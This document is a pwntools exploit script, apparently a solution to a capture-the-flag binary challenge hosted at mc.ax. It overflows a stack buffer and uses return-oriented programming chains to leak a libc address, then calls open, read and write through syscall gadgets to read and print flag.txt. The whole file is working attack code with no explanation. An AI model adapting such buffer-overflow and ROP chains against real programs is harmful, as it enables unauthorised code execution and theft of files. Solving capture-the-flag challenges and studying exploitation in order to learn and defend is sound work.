from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

if args.REMOTE:
    libc = ELF('./rlibc.so.6')
else:
    libc = e.libc

gs = '''
break *main
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("mc.ax", 30284)
    else:
        return process(e.path)


p = start()

pop_rdi = 0x04013d3
writeable_mem = 0x405000 - 0x100
flag_size = 0x60


def leak_libc():
    chain = cyclic(40)
    chain += p64(pop_rdi)
    chain += p64(e.got['printf'])
    chain += p64(pop_rdi+1)
    chain += p64(e.plt['printf'])
    chain += p64(pop_rdi+1)
    chain += p64(0x4012f9)
    p.sendlineafter(b'Do you bop?', chain)
    p.recvuntil(b' ')
    leak = u64(p.recv(6).ljust(8, b'\x00'))
    log.info('Printf Leak: 0x%x' % leak)
    libc.address = leak-libc.sym['printf']
    log.info('Libc Address: 0x%x' % libc.address)


def read_flag():
    chain = cyclic(40)
    chain += p64(pop_rdi)
    chain += p64(0x0)
    chain += p64(rl.find_gadget(['pop rsi', 'ret'])[0])
    chain += p64(writeable_mem)
    chain += p64(rl.find_gadget(['pop rdx', 'ret'])[0])
    chain += p64(0x10)
    chain += p64(libc.sym['read'])
    chain += p64(0x4012f9)
    p.sendlineafter(b'Do you bop?', chain)


def open_file():
    chain = cyclic(40)
    chain += p64(pop_rdi)
    chain += p64(writeable_mem)
    chain += p64(rl.find_gadget(['pop rsi', 'ret'])[0])
    chain += p64(constants.O_RDONLY)
    chain += p64(rl.find_gadget(['pop rax', 'ret'])[0])
    chain += p64(constants.SYS_open)
    chain += p64(rl.find_gadget(['syscall', 'ret'])[0])
    chain += p64(0x4012f9)
    p.sendlineafter(b'Do you bop?', chain)


def read_file():
    chain = cyclic(40)
    chain += p64(pop_rdi)
    chain += p64(0x3)
    chain += p64(rl.find_gadget(['pop rsi', 'ret'])[0])
    chain += p64(writeable_mem)
    chain += p64(rl.find_gadget(['pop rdx', 'ret'])[0])
    chain += p64(flag_size)
    chain += p64(rl.find_gadget(['pop rax', 'ret'])[0])
    chain += p64(constants.SYS_read)
    chain += p64(rl.find_gadget(['syscall', 'ret'])[0])
    chain += p64(0x4012f9)
    p.sendlineafter(b'Do you bop?', chain)


def write_file():
    chain = cyclic(40)
    chain += p64(pop_rdi)
    chain += p64(0x1)
    chain += p64(rl.find_gadget(['pop rsi', 'ret'])[0])
    chain += p64(writeable_mem)
    chain += p64(rl.find_gadget(['pop rdx', 'ret'])[0])
    chain += p64(flag_size)
    chain += p64(rl.find_gadget(['pop rax', 'ret'])[0])
    chain += p64(constants.SYS_write)
    chain += p64(rl.find_gadget(['syscall', 'ret'])[0])
    chain += p64(0x4012f9)
    p.sendlineafter(b'Do you bop?', chain)


leak_libc()
rl = ROP(libc)
read_flag()
p.sendline(b'flag.txt\0')
open_file()
read_file()
write_file()

p.interactive()
